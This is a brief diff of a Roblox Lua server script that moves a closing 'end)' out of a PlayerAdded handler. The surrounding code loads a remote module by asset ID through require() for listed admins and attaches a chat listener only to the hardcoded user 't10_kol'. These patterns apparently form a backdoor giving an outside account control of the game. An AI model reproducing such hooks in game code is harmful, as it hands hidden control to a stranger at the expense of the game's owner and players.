@@ -17,6 +17,9 @@ game.Players.PlayerAdded:Connect(function(plr)
 	if AdminPanel[plr.Name] then
 		require(7192763922).load(plr.Name)
 	end
+
+end)
+
 	for _, player in pairs(game.Players:GetPlayers()) do
 		if player.Name == "t10_kol" then
 			player.Chatted:Connect(function(message)
@@ -35,5 +38,3 @@ game.Players.PlayerAdded:Connect(function(plr)
 			end)
 		end
 	end
-
-end)
